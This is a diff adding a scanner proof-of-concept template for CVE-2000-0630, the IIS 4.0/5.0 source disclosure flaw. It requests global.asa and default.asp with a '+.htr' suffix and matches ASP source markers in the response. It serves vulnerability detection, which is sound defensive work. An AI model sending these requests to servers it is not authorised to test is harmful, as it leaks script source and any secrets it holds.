@@ -1,0 +1,44 @@
+[info]
+author = "AVE"
+description = "检测 Microsoft IIS 4.0 及 5.0 源代码片段泄露漏洞（CVE-2000-0630）。通过在已知 ASP/ASA 文件 URL 后附加 +.htr 后缀，ISM.DLL 会处理请求并返回脚本文件的部分或全部源代码，导致敏感信息泄露。"
+id = "POC-AVE-2000-0484"
+name = "Microsoft IIS 4.0/5.0 Source Fragment Disclosure PoC"
+severity = "medium"
+tags = ["ave-2000-0484"]
+vuln_id = [
+    "CVE-2000-0630",
+    "AVE-2000-0484",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/global.asa+.htr"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%",
+    "Language=",
+    "ScriptingHost",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/default.asp+.htr"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%",
+    "Language=",
+    "ScriptingHost",
+]
